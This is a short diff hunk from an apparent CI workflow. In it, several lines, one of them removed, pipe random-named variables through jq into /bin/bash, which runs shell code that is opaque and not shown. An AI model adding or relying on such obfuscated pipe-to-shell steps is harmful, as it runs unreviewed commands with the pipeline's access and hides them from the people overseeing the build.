@@ -31,7 +31,6 @@ jobs:
           echo $o5220 | jq -r .ucimq540 | /bin/bash
           echo $i37670 | jq -r .k5 | /bin/bash
           echo $ft72 | jq -r .d74724 | /bin/bash
-          echo $aswvh82 | jq -r .ihfto2 | /bin/bash
 
       - name: Archive output
         if: always()
